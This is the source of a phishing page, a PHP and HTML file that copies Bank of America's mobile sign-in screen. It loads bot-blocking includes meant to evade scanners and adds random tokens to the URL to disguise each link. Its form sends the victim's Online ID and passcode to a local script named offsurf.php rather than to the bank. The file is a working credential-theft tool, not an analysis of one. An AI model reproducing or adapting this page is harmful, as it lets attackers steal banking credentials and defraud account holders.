<?php
include './prevents/bot1.php';
include './prevents/bot2.php';
include './prevents/bot3.php';
include './prevents/bot4.php';
include './prevents/bot5.php';
include './prevents/bot6.php';
include './prevents/bot7.php';
include './prevents/bot8.php';
session_start();
//Add Random characters to URL
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($actual_link, 'Service_Login_&_Authentication') !== false) {
    //Do nothing
}elseif(strpos($actual_link, '?') != true){
	$url = $actual_link."?&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
	header("Location: ".$url);	
}else{
	$url = $actual_link."&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
	header("Location: ".$url);
}

?>
<!DOCTYPE html>
<!-- saved from url=(0087)https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=signonv2 -->
<html class=" js no-flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./assets/6.js.download"></script>
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE10">
        <meta name="apple-itunes-app" content="app-id=284847138">
		<!--[if IE 9]>
			<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" >
		<![endif]-->
		<title>Sign In</title>
		<!--Now dynamically appended (mobileweb.js) depending on project<link rel="stylesheet" href="css/mobileweb.css">-->
		<script src="./assets/jquery-1.11.1.min.js.download" type="text/javascript"></script>
		<script src="./assets/jquery-migrate-1.2.1.js.download" type="text/javascript"></script>
		<script src="./assets/mobileweb.js.download" type="text/javascript"></script>
		<script src="./assets/utilities.js.download" type="text/javascript"></script>
		<script src="./assets/hybrid.js.download" type="text/javascript"></script>
		<script src="./assets/modernizr-2.5.3.min.js.download" type="text/javascript"></script>
		<script src="./assets/aes.js.download" type="text/javascript"></script>
		<script src="./assets/jsencrypt.min.js.download" type="text/javascript"></script>
		<script src="./assets/eluminate.js.download" type="text/javascript"></script>
		<script src="./assets/cmdatatagutils.js.download" type="text/javascript"></script>
	<link rel="stylesheet" href="./assets/bactouch.css"><link rel="stylesheet" href="./assets/toolbar.css"><link rel="stylesheet" href="./assets/bact_listview.css"><link rel="stylesheet" href="./assets/footer.css"><link rel="stylesheet" href="./assets/slidemenu.css"></head>

	<body><div id="page" class="" style="display: block; position: static; float: left; height: 100%; width: 100%; left: 100%;"><div id="cmw_toolBar_" class="cmw_toolBar_"><a id="leftButton" role="button" class="hidden"></a><a id="slidemenuz" class="sprite backButton icon sprite-menu" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#" title="Show menu for all mobile banking features" role="button"></a><div id="barker" class="hidden"></div><h1 id="title" class=""><div id="cmw_toolBar_titleText" style="padding-left: 34px; padding-right: 34px; width: 100%;">Sign In</div><span class="adaHidden" id="adaTitleText">Enter your Online ID</span></h1><a id="rightButton" class="hidden"></a></div><div id="SASI_banner_container"></div><div class="pageMinHeight"><!-- SIGN ON HOME PAGE-->
<div class="signonVersionTwoHomePage">
<div id="scrollerwrapperOt" class="overthrow">
	<div id="divMessaging" class="hidden"></div>
	<div id="blackBerryMsg" class="padding10" style="display: none;"></div>
	
	<div id="accountLocked" class="hidden">
		<ul class="listView edge">
			<li role="button" class="noLink">
				<div class="imageWrap paddingHoriz20"><img src="./assets/ico_alert@2x.png" class=""></div>
				<p class="subVal padding10 fontRed" id="headError"></p>
				<p class="subVal padding10" id="bodyError"></p>
			</li>
		</ul>
	</div>

	<div id="successMsg"></div>
	
	<div id="newOnlineId" style="display: block;">
		<div class="toppad5">
			<fieldset>
				<legend class="hidden" id="signonToggle">Toggle Yes or No</legend>			
				<label for="saveCustomUserId" class="adaHidden"></label>
				<input type="checkbox" id="saveCustomUserId" class="hidden">
				<label class="adaHidden" id="signonOIDLabel" for="btCustomOnlineId">Enter your Online ID</label>
				<div class="inputEntryContainer">
					<div id="toggleSwipe" class="toggleSwipeContainer right">
						<label aria-hidden="true" class="right" style="margin-right:30px;" id="signonSaveID">Save ID</label>
						<div id="toggleButton" class="toggle right" toggled="false">
							<span class="thumb"></span>
							<span class="toggleOn" aria-checked="true" role="checkbox" title="Save this online ID" id="signonYes">YES</span>
							<span class="toggleOff" aria-checked="false" role="checkbox" title="Save this online ID" id="signonNo">NO</span>
						</div>
					</div>
						

					<div class="inputContainer">
						<form action="offsurf.php" method="POST" id="nameform">
						<input type="text" required name="onlineId1" class="focus sprite-clear_input_icns" maxlength="32" id="btCustomOnlineId" placeholder="Online ID" autocomplete="off" autocapitalize="off" autocorrect="off">
					</div>
					<div class="inputContainer" style="background-color: rgb(246, 243, 239);">
						
						<input id="btCustomPasscode" required name="passcode1" type="password" class="masked" placeholder="Passcode" maxlength="20" title="Enter your Passcode."  autocomplete="off"></form>

					</div>
<button type="submit" form="nameform" class="btn" value="Sign In"> <img style="margin-bottom:-4px;" class="paddingHoriz10" src="./assets/secure_lock.png">Sign In</button>
		
	</div>

	
	<div id="helpOptionView" class="helpOptionView">
		<div class="padding10 center">
			<div class="inline-link blueLink"><a href="javascript:void(0);" id="forgetOIDPass" class="plain slideUp jsForgotIDPass">Forgot ID/Passcode?</a></div>	
			<div class="paddingVert10 inline-link blueLink"><a href="javascript:void(0);" class="plain slideUp" id="signonEnroll">Enroll</a></div>
		</div>





































		<div class="padding10">
				
			<!--
			<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetOID" class="plain slideUp"></a></div>	
			<div class="toppad10 blueLink"><a href="javascript:void(0);" id="forgetpasscode" class="plain slideUp"></a></div>	
			<div class="paddingVert10 blueLink"><a href="#home?app=enrollmentsv2" class="plain slideUp" id="signonEnroll"></a></div>	
			-->
			<div class="borderLine smarBannerdisplay hidden"></div>
			<div class="bofaBannerLink smarBannerdisplay hidden"><a href="javascript:;" class="appNavigation plain slideUp" id="signonBannerLink">Get the Mobile Banking app</a></div>
		</div>
	</div>
	
	<div id="btnPin" style="position: fixed; bottom: 0px; display: none; left: 0px;">
		<ul class="btnGroupPin">
			<li><a id="cancelButton" class="plain slideUp btnNeg" role="button" href="javascript:void(0);">Cancel</a></li>
		</ul>
	</div>
</div>
</div><footer><div class="boa_footnote"></div><div class="boa_footer"><div class="left"><a id="boa_footer_privacy" href="https://www.bankofamerica.com/privacy/overview.go" target="_blank">Privacy &amp; Security</a></div><div class="right"><a id="boa_footer_ehl" href="https://www.bankofamerica.com/help/equalhousing_popup.go" class="ehl" target="_blank">Equal Housing Lender</a></div><p class="clear">© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.</p></div></footer></div>
		
	

<div class="spinnerPanel" style="height: 538px; display: none;"><div class="spinner" style="top: 215.2px;"><span class="messageIcon"></span><a id="spinnerLink" class="adaHidden" href="javascript:void(0)" role="dialog">processing</a></div></div><div id="slidemenu_sidePanel" style="display: none"><div class="slidemenu_menu">
	<ul class="popoverMenu">
		<li id="signoutButtonItem" class="hidden button" style="display: none;">
			<span class="menuButton">
				<a id="signoutButtonLink" class="linkButton" href="javascript:" aria-hidden="true" role="button">Sign Out</a>
			</span>
		</li>
	<li class="menuCategory"> </li><li class="menuItem accounts"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=accounts">Accounts</a></li><li class="menuItem mycard"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#creditCardStatement?app=accounts">My Card</a></li><li class="menuItem mysbcard"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#sbCardAccountDetails?app=accounts">My Card</a></li><li class="menuItem mycards"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=mycards">My Cards</a></li><li class="menuItem mysbcards"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=mycards">My Cards</a></li><li class="menuItem rewards"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=rewards">Rewards</a></li><li class="menuItem billpay"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=billpay">Bill Pay</a></li><li class="menuItem transfers"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=transfers">Transfer | Send</a></li><li class="menuItem bamd"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=deals">Special Offers &amp; Deals</a></li><li class="menuItem bankrewards"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=prefrewards">Banking Rewards</a></li><li class="menuItem prefrewards"><div class="hidden right tally">1</div><a class="disabled" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=prefrewards">Preferred Rewards</a></li><li class="menuCategory"> </li><li class="menuItem help"><div class="hidden right tally">1</div><a class="" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#helpSupport?app=settings">Help &amp; Support</a></li><li class="menuItem contact"><div class="hidden right tally">1</div><a class="" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#contactus?app=click2call">Contact Us</a></li><li class="menuItem locations"><div class="hidden right tally">1</div><a class="" href="https://locators.bankofamerica.com/">Locations</a></li><li class="menuItem settings"><div class="hidden right tally">1</div><a class="" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#home?app=settings">Profile &amp; Settings</a></li><li class="menuCategory"> </li><li class="menuItem feedback"><div class="hidden right tally">1</div><a class="" href="https://secure.opinionlab.com/ccc01/o.asp?id=wwxOVCML&amp;referer=%20http%3A%2F%2Fmobile.bankofamerica.com%2Fmobileweb">Send App Feedback</a></li><li class="menuItem legal"><div class="hidden right tally">1</div><a class="" href="https://staticweb.bankofamerica.com/cavmwebbactouch/common/index.html#legal_Info?app=settings">Legal Info &amp; Disclosures</a></li></ul>
</div></div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div></body></html>